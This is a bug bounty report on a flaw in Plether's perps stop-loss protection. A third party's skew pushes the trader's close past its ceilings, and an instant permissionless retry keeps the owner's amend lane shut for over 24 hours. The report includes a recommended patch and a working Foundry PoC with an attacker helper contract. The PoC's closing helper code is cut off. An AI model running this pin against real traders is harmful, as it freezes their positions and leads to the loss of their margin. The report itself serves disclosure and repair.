# \#99529 [SC-High] Any account can lock a trader's triggered stop loss open for more than 24 hours by denying the owner's only limit-amend lane, leaving the position impossible to close or cancel

**Submitted on Nov 14th 2026 at 03:33:07 UTC by @jh42 for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99529
- **Report Type:** Smart Contract
- **Report severity:** High
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Temporary freezing of funds for at least 24 hours

## Description

## Brief/Intro

Once a stop loss triggers, the trader can neither close nor cancel the position. Any account can make sure the owner never gets that window. The protection copies the trader's ceilings into every trigger and retry close, but the compared quantities include live, skew-driven VPI, so another account's position pushes the stop-loss close over a ceiling and latches the protection. `retryPositionProtectionClose` is permissionless, so a contract settles the failed attempt and retries in the same transaction: the protection goes `Latched -> Triggered` inside it and the owner's amend always reverts. 

### Root cause

- The ceilings and the owner's amend lane were introduced together by the fix for the pre-audit finding on keeper retries without trader limits (MED-9). That finding was missing ceilings, so a keeper could close a trader beyond what the trader accepted. This is a different bug, introduced by the fix: the ceilings can be breached by a third party, and the amend lane that is meant to recover from it can be kept shut by a third party.
- The fix's own acknowledgement relies on the lane: "Only the owner may amend the retained ceilings while protection is Latched; keepers cannot relax them." The natspec says the same (`IPositionProtectionActions.sol:32-33`: "Lets the owner change close limits after a failed attempt relatches, before a fresh retry") and so does `CANONICAL_ENTRYPOINTS.md:145-148`.
- The reference client documents the same ordering (`packages/perps-aa-client/README.md:203-205`): the amend builder "lets the owner change the close limits of a `Latched` protection before a permissionless retry". The attack makes the permissionless retry always come first, so the documented window never opens.

1. The stored ceilings are copied into every attempt, and the compared quantities are live. VPI is computed from the live pre and post skew and the pool depth, and the gross debit includes it.

```solidity
// OrderLiquidationBatchLogic.sol:674-677 (_protectionCloseRequest)
request.bounds.maxExecutionNotionalAssets = limits.maxExecutionNotionalAssets;
request.bounds.maxGrossAccountDebitAssets = limits.maxGrossAccountDebitAssets;
request.bounds.maxActionChargeAssets = limits.maxActionChargeAssets;
request.bounds.maxExplicitFeesAssets = limits.maxExplicitFeesAssets;

// CloseAccountingLib.sol:107-111
if (inputs.poolDepthAssets != 0) {
    state.vpiDeltaAssets = CfdMath.calculateVPI(
        inputs.preSkewAssets, inputs.postSkewAssets, inputs.poolDepthAssets, inputs.vpiFactor
    );
}

// CfdOrderPolicyEvaluatorBase.sol:410-411 and :504-508
assessment.grossAccountDebitAssets = delta.pricePnlClaimConsumedAssets + delta.pricePnlPledgeConsumedAssets
    + delta.realizedCarryAssets + delta.actionChargeCollectedAssets + executionBountyAssets;
_requireMaximum(
    OrderV3Types.ConstraintKind.GrossAccountDebit, assessment.grossAccountDebitAssets, bounds.maxGrossAccountDebitAssets
);
```

2. A breach is terminal for that attempt, and every terminal reason except four relatches the protection instead of failing it. `ConstraintViolation` and `Expired` are both relatch reasons.

```solidity
// OrderRouterExecutionSidecar.sol:879-892 classifies CfdOrderPolicyEvaluator__ConstraintViolation as terminal

// PositionProtectionBook.sol:1017-1022
function _isFailedProtectionAttemptReason(OrderV3Types.TerminalReason reason) private pure returns (bool) {
    return reason != OrderV3Types.TerminalReason.None && reason != OrderV3Types.TerminalReason.Executed
        && reason != OrderV3Types.TerminalReason.RiskOff && reason != OrderV3Types.TerminalReason.AccountLiquidated;
}

// PositionProtectionBook.sol:662-667, called from OrderRouter.sol:324-329 while the failed attempt is finalized
delete _attemptProtectionIds[orderId];
retained = _positionMatches(protection);
emit PositionProtectionCloseAttemptFailed(protectionId, account, orderId, reason, retained);
if (retained) {
    protection.status = PositionProtectionTypes.PositionProtectionStatus.Latched;
    return true;
}
```

3. The owner's only lever on the ceilings needs `Latched` and an empty queue. Every other owner action is closed while the protection is `Triggered`.

```solidity
// PositionProtectionBook.sol:315-328
function amendLatchedPositionProtectionCloseLimits(uint64 protectionId, CloseFinancialLimits calldata limits) external nonReentrant {
    StoredProtection storage protection = _ownedActiveProtection(protectionId, msg.sender);
    if (protection.status != PositionProtectionTypes.PositionProtectionStatus.Latched) {
        revert OrderRouter__ProtectionNotLatched();
    }
    if (IPositionProtectionRouterHost(ROUTER).pendingOrderCounts(msg.sender) != 0) {
        revert OrderRouter__PendingOrdersExist();
    }
    _setCloseLimits(protection, limits);
    _emitCloseLimitsUpdated(protection);
}

// replace: PositionProtectionBook.sol:272-277 (needs PendingOpen or Armed)
// cancel: :414-419 (needs PendingOpen or Armed)
// cancel and commit close: :346-348 (needs Armed)
// ordinary close: OrderLiquidationBatchLogic.sol:313-315
if (enforceProtectionLock && host.positionProtectionBook().activePositionProtectionId(account) != 0) {
    revert OrderRouter__ProtectionActive();
}
```

4. The retry is callable by anyone, immediately, and re-queues the attempt. It only needs the status to be `Latched` and no pending order, and both hold the moment the failed attempt has been finalized.

```solidity
// PositionProtectionBook.sol:382-406
function retryPositionProtectionClose(uint64 protectionId) external nonReentrant returns (uint64 linkedOrderId) {
    StoredProtection storage protection = _activeProtection(protectionId);
    if (protection.status != PositionProtectionTypes.PositionProtectionStatus.Latched) {
        revert OrderRouter__ProtectionNotLatched();
    }
    _requireMatchingPosition(protection);
    IPositionProtectionRouterHost router = IPositionProtectionRouterHost(ROUTER);
    if (router.pendingOrderCounts(protection.account) != 0) {
        revert OrderRouter__PendingOrdersExist();
    }
    ...
    linkedOrderId = IPositionProtectionCloseAttemptHost(ROUTER)
        .commitProtectionCloseAttempt(protectionId, protection.account, protection.side, protection.size);
    ...
    _recordCloseAttempt(protection, linkedOrderId);     // :564-578 sets status = Triggered
}
```

- A contract that calls `executeOrder` or `expireOrder` on the live attempt and then `retryPositionProtectionClose` in the same transaction never leaves `Latched` visible. There is no owner-exclusive period after a latch. A retried attempt carries a zero bounty (`SECURITY.md:1356-1359`), so no keeper is paid to execute it inside its 60 second window.
- The amend lane is the only owner exit from this state. It is denied in every block in which the attacker acts.
- `SECURITY.md:1356-1359` tells operators to alert on a prolonged `Latched` state without a live child. In this attack the status is `Triggered` with a live child after every transaction (asserted in every cycle of the PoC), so that alert never fires.

### Impact

- Release parameters (`DEPLOYMENT.md:131-142`), two permissionless actors, one price path. All numbers come from the PoC below.
- Alice's 200,000 long with 2,000 margin cannot be closed, cancelled or replaced for 25 cycles (more than 24 hours), and she cannot be liquidated in any of them (asserted every cycle). When the mark then moves on she loses her whole margin: 2,000.40 against 760.86 when the stop executes.
- The 1,239.54 difference goes to the liquidator (100.00) and the pool.
- Preconditions, with the code behind each:

(1) Alice's protection has finite ceilings. `CANONICAL_ENTRYPOINTS.md:121-124` tells integrations to set them from the trader's intended close policy and not to assume an unlimited default, and the reference client requires all four ceilings and inserts no unlimited defaults (`packages/perps-aa-client/README.md:208-214`: "use `maxUint256` only when unlimited authority is intended").

(2) Another account's position breaches a ceiling. Bob opens a 300,000 short through the public router. The book flips from net long 200,000 to net short 100,000, closing Alice's long now adds skew, and its gross debit rises from 600.22 to 1,082.04 against the 1,000.00 ceiling (`GrossAccountDebit`, decoded from the attempt's receipt).

(3) Alice cannot act between the attacker's transactions. From `Triggered`, amend reverts `ProtectionNotLatched`, cancel, cancel-and-close and replace revert `ProtectionNotArmed`, and a close commit reverts `ProtectionActive`. Her two-step path is to expire the stale attempt, which latches it, and then amend.

(4) No keeper is paid to execute a retried attempt (`SECURITY.md:1356-1359`), and the PoC leaves each one to expire. The attacker's contract settles and re-queues once per hour.

(5) The mark stays between Alice's stop and her liquidation threshold during the pin, so nobody can end it by liquidating her. The PoC feeds +30 bps at the trigger, holds +50 bps through the pin (her threshold is about +65 bps) and asserts in every cycle that she is not liquidatable. The mark moves to +95 bps only after the 24 hours, when Bob's account liquidates her.

- The scope lists "Temporary freezing of funds for at least 24 hours" as High. The pin is demonstrated for more than 24 hours with the position open, every owner exit closed and no liquidation available to end it.


### User story

1. Alice opens a 200,000 USDG long with 2,000 USDG margin at 1.0000 and arms a stop loss at +30 bps with the ceilings above. Without an attacker the stop executes: the close debits 600.22 (including a 199.60 VPI rebate) and Alice loses 760.86.
2. Bob opens a 300,000 USDG short with 3,000 margin through the public router.
3. Bob's second account triggers the stop and receives the 0.20 trigger bounty. The pin contract executes the first attempt in the first block that allows it: gross debit 1,082.04 against 1,000.00, `ConstraintViolation`, protection `Latched`. In the same transaction it retries and the protection is `Triggered`. Alice's amend reverts.
4. Once per hour the pin contract expires the stale attempt and retries in one transaction. The mark is held at +50 bps, where Alice cannot be liquidated (asserted in every cycle). 25 cycles pass the 24 hour mark. In the 11th cycle Alice expires the attempt herself and Bob's retry is sequenced before her amend, which reverts. At the end Alice holds a 1,000.00 unrealised loss, and amend, cancel, cancel-and-close, replace and a close commit all revert.
5. After the 24 hours the mark moves to +95 bps. Bob's second account liquidates Alice: 1,720.40 of equity is taken, 100.00 to the liquidator and 1,620.40 to the pool. Alice's total loss is 2,000.40.
6. Bob closes his short at the same mark: 2,850.00 of price gain and 254.64 of fees, bounties and carry, 2,595.36 net.

### Recommendation

- Let the owner amend the ceilings while the protection is `Triggered` as well as `Latched`, and drop the empty-queue check. A live attempt keeps the bounds it was registered with, and the amended ceilings bind the next retry, so the owner can restore execution whatever the attacker's retry timing. The empty-queue check only stops the amend while an attempt is live, which is the state the owner needs to act in.

```diff
--- a/packages/perps/src/PositionProtectionBook.sol
+++ b/packages/perps/src/PositionProtectionBook.sol
@@ -317,12 +317,15 @@
         PositionProtectionTypes.CloseFinancialLimits calldata limits
     ) external nonReentrant {
         StoredProtection storage protection = _ownedActiveProtection(protectionId, msg.sender);
-        if (protection.status != PositionProtectionTypes.PositionProtectionStatus.Latched) {
+        PositionProtectionTypes.PositionProtectionStatus status = protection.status;
+        if (
+            status != PositionProtectionTypes.PositionProtectionStatus.Latched
+                && status != PositionProtectionTypes.PositionProtectionStatus.Triggered
+        ) {
             revert OrderRouter__ProtectionNotLatched();
         }
-        if (IPositionProtectionRouterHost(ROUTER).pendingOrderCounts(msg.sender) != 0) {
-            revert OrderRouter__PendingOrdersExist();
-        }
+        // A live attempt keeps the bounds it was registered with; the amended ceilings bind only the next retry,
+        // so the owner can always restore execution regardless of a third party's retry timing.
         _setCloseLimits(protection, limits);
         _emitCloseLimitsUpdated(protection);
     }
```

- With this patch applied to a scratch copy of the contracts, the PoC below fails at its first lock assertion (`next call did not revert as expected`): Alice's amend after the first attempt succeeds.
- In a second scratch test on the patched copy, Alice amends from `Triggered`, the attacker's next retry copies the widened ceilings, the next attempt executes and Alice's position is closed at the stop mark.
- On the patched copy `test/perps/spec/trader/PositionProtection.t.sol` passes 103 of 104 tests. The one failure, `test_ProtectionCloseLimits_OnlyOwnerCanAmendLatchedLimitsForNextRetry`, asserts the old rule that amend reverts while a child is live.
- To stop a third party's position from breaching the ceilings in the first place, also keep skew-driven VPI out of the stored ceilings, or re-arm a `ConstraintViolation` attempt instead of latching it.
- Also give the owner an exit that does not depend on the ceilings or on a retry race: let `cancelPositionProtectionAndCommitClose` run from `Latched`, so the owner can cancel the protection and commit an ordinary close.
- Update the natspec in `IPositionProtectionActions.sol:32-33`, `CANONICAL_ENTRYPOINTS.md:145-148` and the `Latched` text in `SECURITY.md:547-552`.


## References


- PositionProtectionBook.sol, amend needs `Latched` and an empty queue: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L315-L328
- PositionProtectionBook.sol, permissionless instant retry: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L382-L406
- PositionProtectionBook.sol, attempt recorded as `Triggered`: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L564-L578
- PositionProtectionBook.sol, failed attempt relatches: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L637-L675
- PositionProtectionBook.sol, relatch reasons: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L1017-L1022
- PositionProtectionBook.sol, replace, cancel and cancel-and-close need `PendingOpen` or `Armed`: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L272-L277
- OrderRouter.sol, relatch written while the failed attempt is finalized: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/OrderRouter.sol#L324-L329
- OrderLiquidationBatchLogic.sol, every ordinary commit rejected while protection is active: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/router/OrderLiquidationBatchLogic.sol#L313-L315
- OrderLiquidationBatchLogic.sol, stored ceilings copied into each attempt: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/router/OrderLiquidationBatchLogic.sol#L657-L680
- CfdOrderPolicyEvaluatorBase.sol, gross debit and ceiling checks: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdOrderPolicyEvaluatorBase.sol#L410-L411
- CloseAccountingLib.sol, VPI from live skew and depth: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/CloseAccountingLib.sol#L107-L111
- OrderRouterExecutionSidecar.sol, `ConstraintViolation` is terminal: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/OrderRouterExecutionSidecar.sol#L879-L892
- IPositionProtectionActions.sol, the amend lane as documented: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/interfaces/IPositionProtectionActions.sol#L32-L33
- CANONICAL_ENTRYPOINTS.md, ceilings set from the intended close policy: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/CANONICAL_ENTRYPOINTS.md?plain=1#L121-L124
- CANONICAL_ENTRYPOINTS.md, owner amend after relatch: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/CANONICAL_ENTRYPOINTS.md?plain=1#L145-L148
- SECURITY.md, retries carry a zero bounty: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/SECURITY.md?plain=1#L1356-L1359
- perps-aa-client README, amend before a permissionless retry, and explicit ceilings with no unlimited defaults: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps-aa-client/README.md?plain=1#L203-L214
- Plether docs, TP/SL page (a triggered protection cannot be edited or removed, no wallet-operated retry): https://docs.plether.com/trading-on-plether-perps/take-profit-and-stop-loss.md
- Plether docs, risks page (a latched close remains binding even if the price reverses): https://docs.plether.com/welcome/risks-you-should-understand-first.md
- Plether docs, close orders cannot be cancelled by the trader: https://docs.plether.com/trading-on-plether-perps/reduce-or-close-a-position.md
- Plether docs, no execution reward for closes and TP/SL close orders: https://docs.plether.com/how-plether-works/keepers-and-permissionless-execution.md
- Plether docs, VPI is calculated at execution and can change while an order waits: https://docs.plether.com/how-plether-works/trading-costs-fees-carry-and-vpi.md
- DEPLOYMENT.md, release risk parameters: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/DEPLOYMENT.md?plain=1#L131-L142


## Proof of Concept


```bash
forge test --root packages/perps --match-path test/perps/ProtectionPin.t.sol -vv
```

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "./BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {IOrderLifecycleBook} from "@plether/perps/interfaces/IOrderLifecycleBook.sol";
import {IOrderRouterErrors} from "@plether/perps/interfaces/IOrderRouterErrors.sol";
import {IPositionProtectionActions} from "@plether/perps/interfaces/IPositionProtectionActions.sol";
import {IPositionProtectionViews} from "@plether/perps/interfaces/IPositionProtectionViews.sol";
import {PositionProtectionTypes} from "@plether/perps/interfaces/PositionProtectionTypes.sol";
import {MockPyth} from "@plether/test-utils/MockPyth.sol";
import {Vm} from "forge-std/Vm.sol";

interface IProtectionBook is IPositionProtectionActions, IPositionProtectionViews {}

interface IPinRouter {

    function expireOrder(
        uint64 orderId
    ) external returns (OrderV3Types.ExecutionResult memory);

    function executeOrder(
        uint64 orderId,
        bytes[] calldata pythUpdateData
    ) external payable returns (OrderV3Types.ExecutionResult memory);

}

contract PinHelper {

    IPinRouter public immutable ROUTER;
    IPositionProtectionActions public immutable BOOK;

    constructor(
        address router,
        address book
    ) {
        ROUTER = IPinRouter(router);
        BOOK = IPositionProtectionActions(book);
    }

    function executeAndRetry(
        uint64 attemptId,
        uint64 protectionId,
        bytes[] calldata pythUpdateData
    ) external returns (OrderV3Types.ExecutionResult memory result, uint64 nextAttemptId) {
        result = ROUTER.executeOrder(attemptId, pythUpdateData);
        nextAttemptId = BOOK.retryPositionProtectionClose(protectionId);
    }

    function expireAndRetry(
        uint64 attemptId,
        uint64 protectionId
    ) external returns (uint64 nextAttemptId) {
        ROUTER.expireOrder(attemptId);
        nextAttemptId = BOOK.retryPositionProtectionClose(protectionId);
    }

}

contract ProtectionPinPoC is BasePerpTest {

    IProtectionBook internal book;
    PinHelper internal pinner;

    address internal constant ALICE = address(0xA11CE); // victim: long 200k with a stop loss, plain EOA
    address internal constant BOB = address(0xB0B); // attacker: holds the 300k short that moves the skew
    address internal constant BOB_KEEPER = address(0xB0B2); // attacker's position-free account: trigger caller, liquidator
    address internal constant KEEPER = address(0x7106); // honest keeper used in the control run
    address internal constant PINNER_EOA = address(0x91AA); // sender of the pin transactions

    uint256 internal constant P0 = 1e8; // entry mark 1.0000
    uint256 internal constant STOP = 100_300_000; // the long's stop loss: +30 bps against it
    uint256 internal constant HOLD_MARK = 100_500_000; // +50 bps: between the stop and Alice's liquidation threshold
    uint256 internal constant LIQ_MARK = 100_950_000; // +95 bps against it: liquidation threshold crossed
    uint256 internal constant SIZE = 200_000e18;
    uint256 internal constant MARGIN = 2_000e6; // 1% margin, 100x
    uint256 internal constant ATTACK_SHORT = 300_000e18;
    uint256 internal constant ATTACK_MARGIN = 3_000e6;
    uint256 internal constant ALICE_FUNDS = 20_000e6;
    uint256 internal constant BOB_FUNDS = 400_000e6;

    bytes32 internal constant POSITION_CLOSED = keccak256("PositionClosed(address,uint8,uint256,uint256,int256)");

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function setUp() public override {
        super.setUp();
        book = IProtectionBook(address(router.positionProtectionBook()));
        pinner = new PinHelper(address(router), address(book));
        _fundTrader(ALICE, ALICE_FUNDS);
        _fundTrader(BOB, BOB_FUNDS);
        _fundTrader(BOB_KEEPER, 1e6);
        _refreshMark(P0);
    }

    function test_ThirdPartySkewLatchesStopLossAndPermissionlessRetryPinsItUntilLiquidation() public {
        // ---- Control: same position, same protection, same ceilings, no attacker. The stop executes. ----
        uint256 snapshot = vm.snapshotState();
        uint64 controlId = _openAliceAndArmStop();
        uint64 controlAttempt = _trigger(KEEPER, controlId);
        vm.recordLogs();
        OrderV3Types.ExecutionResult memory control = _execute(KEEPER, controlAttempt, STOP);
        OrderV3Types.OrderEconomics memory controlEconomics = _firstReceipt(vm.getRecordedLogs()).economics;
        assertEq(uint8(control.status), uint8(OrderV3Types.LifecycleStatus.Executed), "control: the stop executes");
        assertEq(_size(ALICE), 0, "control: Alice is out at the stop");
        assertLt(controlEconomics.grossAccountDebitAssets, 1_000e6, "control: the close is inside Alice's ceiling");
        uint256 controlLoss = ALICE_FUNDS - _total(ALICE);
        vm.revertToState(snapshot);

        // ---- Attack ----
        uint64 id = _openAliceAndArmStop();
        uint256 poolArmed = pool.totalAssets();
        uint256 aliceOpeningCost = ALICE_FUNDS - _total(ALICE);

        // Bob opens a 300k short through the public router. The book flips from net long 200k to net short 100k, so
        // closing Alice's long now adds skew and is charged VPI.
        vm.recordLogs();
        vm.prank(BOB);
        uint64 bobOpen = router.commitOrder(CfdTypes.Side.SHORT, ATTACK_SHORT, ATTACK_MARGIN, P0, false);
        router.executeOrder(bobOpen, _mockPythUpdateData(P0));
        assertEq(_size(BOB), ATTACK_SHORT, "Bob's short is open");

        // His position-free account triggers Alice's stop (permissionless; it is paid her reserved trigger bounty).
        // The first attempt fails on her gross-debit ceiling because of his skew. The pin contract settles it and
        // re-queues in the same transaction.
        uint256 keeperStart = clearinghouse.balanceAssets(BOB_KEEPER);
        uint64 attempt = _trigger(BOB_KEEPER, id);
        uint256 triggerBounty = clearinghouse.balanceAssets(BOB_KEEPER) - keeperStart;
        bytes[] memory data = _mockPythUpdateData(STOP);
        vm.prank(PINNER_EOA);
        OrderV3Types.ExecutionResult memory first;
        (first, attempt) = pinner.executeAndRetry(attempt, id, data);
        assertEq(
            uint8(first.terminalReason), uint8(OrderV3Types.TerminalReason.ConstraintViolation), "first attempt fails"
        );
        assertEq(uint8(_status(id)), uint8(PositionProtectionTypes.PositionProtectionStatus.Triggered), "Triggered");
        _expectAmendLocked(id);

        // ---- Pin for more than 24 hours: one permissionless expire + retry per cycle. The mark is held at +50 bps, past
        //      the stop and short of Alice's liquidation threshold, so nobody can end the pin by liquidating her. ----
        uint256 pinStart = vm.getBlockTimestamp();
        uint256 cycles;
        uint256 pinGas;
        while (vm.getBlockTimestamp() < pinStart + 24 hours + 1 hours) {
            uint64 deadline = router.lifecycleBook().orderTiming(attempt).executionDeadline;
            vm.warp(uint256(deadline) + 1 hours);
            _refreshMark(HOLD_MARK);
            assertFalse(publicLens.getPosition(ALICE).liquidatable, "Alice cannot be liquidated during the pin");
            if (cycles == 10) {
                attempt = _ownerTriesTwoStepRecovery(id, attempt);
            } else {
                uint256 gasBefore = gasleft();
                vm.prank(PINNER_EOA);
                attempt = pinner.expireAndRetry(attempt, id);
                pinGas += gasBefore - gasleft();
            }
            ++cycles;
            assertEq(uint8(_status(id)), uint8(PositionProtectionTypes.PositionProtectionStatus.Triggered));
            _expectAmendLocked(id);
        }
        assertGe(vm.getBlockTimestamp() - pinStart, 24 hours, "pinned for at least 24 hours");
        assertEq(_size(ALICE), SIZE, "the position is still open");
        int256 pinnedPnl = publicLens.getPosition(ALICE).unrealizedPnlAssets;
        assertLt(pinnedPnl, -900e6, "Alice holds a loss she cannot realise at her stop");
        _assertEveryOwnerExitIsClosed(id);

        // ---- The mark then moves to +95 bps and Bob's account liquidates Alice (permissionless) ----
        _refreshMark(LIQ_MARK);
        assertTrue(publicLens.getPosition(ALICE).liquidatable, "Alice is liquidatable");
        uint256 aliceBeforeLiq = _total(ALICE);
        uint256 poolBeforeLiq = pool.totalAssets();
        uint256 keeperBeforeLiq = clearinghouse.balanceAssets(BOB_KEEPER);
        bytes[] memory liqData = _mockPythUpdateData(LIQ_MARK);
        vm.prank(BOB_KEEPER);
        router.executeLiquidation(ALICE, liqData);
        assertEq(_size(ALICE), 0, "Alice is liquidated");
        uint256 liquidationBounty = clearinghouse.balanceAssets(BOB_KEEPER) - keeperBeforeLiq;
        uint256 aliceLossAtLiq = aliceBeforeLiq - _total(ALICE);
        uint256 poolGainAtLiq = pool.totalAssets() - poolBeforeLiq;

        // ---- Bob closes his short at the same mark so that his all-in result is realised ----
        vm.prank(BOB);
        uint64 bobClose = router.commitOrder(CfdTypes.Side.SHORT, ATTACK_SHORT, 0, 0, true);
        OrderV3Types.ExecutionResult memory closed = _execute(KEEPER, bobClose, LIQ_MARK);
        assertEq(uint8(closed.status), uint8(OrderV3Types.LifecycleStatus.Executed), "Bob's short closes");

        Vm.Log[] memory logs = vm.getRecordedLogs();
        OrderV3Types.FailureDetails memory failure = _firstConstraintFailure(logs);
        int256 shortPriceGain = _realizedPnl(logs, BOB);
        uint256 attackLoss = ALICE_FUNDS - _total(ALICE);
        uint256 bobNet = _total(BOB) - BOB_FUNDS;

        emit log_named_uint("cycles to cross 24 h", cycles);
        emit log_named_decimal_int("Alice unrealised PnL while pinned    ", pinnedPnl, 6);
        emit log_named_uint("average gas of one expire + retry tx", pinGas / (cycles - 1));
        emit log_named_decimal_uint("control: gross debit of the close   ", controlEconomics.grossAccountDebitAssets, 6);
        emit log_named_decimal_int("control: VPI of the close (rebate<0)", controlEconomics.vpiAssets, 6);
        emit log_named_decimal_uint("first attempt: actual gross debit   ", failure.actual, 6);
        emit log_named_decimal_uint("first attempt: Alice's ceiling      ", failure.limit, 6);
        emit log_named_decimal_uint("Alice loss, control (stop executes) ", controlLoss, 6);
        emit log_named_decimal_uint("Alice loss, attack (pinned)         ", attackLoss, 6);
        emit log_named_decimal_uint("Alice extra loss over the control   ", attackLoss - controlLoss, 6);
        emit log_named_decimal_uint("Alice paid before the trigger       ", aliceOpeningCost, 6);
        emit log_named_decimal_uint("Alice equity taken at liquidation   ", aliceLossAtLiq, 6);
        emit log_named_decimal_uint("  to the liquidator (Bob's account) ", liquidationBounty, 6);
        emit log_named_decimal_uint("  to the pool (LPs)                 ", poolGainAtLiq, 6);
        emit log_named_decimal_uint("trigger bounty to Bob's account     ", triggerBounty, 6);
        emit log_named_decimal_uint("Bob short: realised price gain      ", uint256(shortPriceGain), 6);
        emit log_named_decimal_uint("Bob short: all-in gain after exit   ", bobNet, 6);
        emit log_named_decimal_uint("Bob short: fees, bounties, carry    ", uint256(shortPriceGain) - bobNet, 6);
        emit log_named_decimal_int(
            "pool cash change, Alice armed -> all closed", int256(pool.totalAssets()) - int256(poolArmed), 6
        );

        assertEq(uint8(failure.constraint), uint8(OrderV3Types.ConstraintKind.GrossAccountDebit), "on the ceiling");
        assertGt(failure.actual, failure.limit, "actual gross debit is above Alice's ceiling");
        assertLt(controlLoss, 800e6, "control: Alice loses the 30 bps move plus fees");
        assertGt(attackLoss, 1_990e6, "attack: Alice loses her whole margin");
        assertGt(attackLoss - controlLoss, 1_200e6, "the pin costs Alice more than 1,200 USDG over the control");
        assertEq(liquidationBounty, 100e6, "the liquidator collects the 5 bps bounty");
        assertEq(poolGainAtLiq + liquidationBounty, aliceLossAtLiq, "Alice's equity goes to the liquidator and the pool");
    }

    // ---------------------------------------------------------------------------------------------
    // Alice's best effort mid-pin: expire the stale attempt herself, then amend. The attacker's retry lands
    // between her two transactions (the ordering is the PoC's input), so her amend reverts.
    // ---------------------------------------------------------------------------------------------
    function _ownerTriesTwoStepRecovery(
        uint64 id,
        uint64 attempt
    ) internal returns (uint64 nextAttempt) {
        PositionProtectionTypes.CloseFinancialLimits memory wide = _wideLimits();
        vm.prank(ALICE);
        router.expireOrder(attempt);
        assertEq(uint8(_status(id)), uint8(PositionProtectionTypes.PositionProtectionStatus.Latched), "Latched");
        vm.prank(PINNER_EOA);
        nextAttempt = book.retryPositionProtectionClose(id);
        vm.prank(ALICE);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotLatched.selector);
        book.amendLatchedPositionProtectionCloseLimits(id, wide);
    }

    function _assertEveryOwnerExitIsClosed(
        uint64 id
    ) internal {
        // Arguments that read other contracts are built first: a view call would consume the prank and expectRevert.
        OrderV3Types.OrderRequest memory closeRequest = _fullCloseRequest();
        uint256 capPrice = engine.CAP_PRICE();
        PositionProtectionTypes.CloseFinancialLimits memory wide = _wideLimits();
        PositionProtectionTypes.PositionProtectionParams memory params;
        params.stopLossTriggerPrice = STOP;
        params.closeLimits = wide;

        vm.prank(ALICE);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotLatched.selector);
        book.amendLatchedPositionProtectionCloseLimits(id, wide);

        vm.prank(ALICE);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotArmed.selector);
        book.cancelPositionProtection(id);

        vm.prank(ALICE);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotArmed.selector);
        book.cancelPositionProtectionAndCommitClose(id, closeRequest);

        vm.prank(ALICE);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotArmed.selector);
        book.replacePositionProtection(id, params);

        vm.prank(ALICE);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionActive.selector);
        router.commitOrder(CfdTypes.Side.LONG, SIZE, 0, capPrice, true);
    }

    function _expectAmendLocked(
        uint64 id
    ) internal {
        PositionProtectionTypes.CloseFinancialLimits memory wide = _wideLimits();
        vm.prank(ALICE);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotLatched.selector);
        book.amendLatchedPositionProtectionCloseLimits(id, wide);
    }

    // ---------------------------------------------------------------------------------------------
    // Setup and oracle helpers
    // ---------------------------------------------------------------------------------------------

    /// @dev Alice opens a 200k long (2,000 margin) and arms a stop loss. The ceilings are set the way
    ///      CANONICAL_ENTRYPOINTS.md describes: from her intended close policy, with headroom over the 4 bps fee and
    ///      normal carry.
    function _openAliceAndArmStop() internal returns (uint64 id) {
        vm.prank(ALICE);
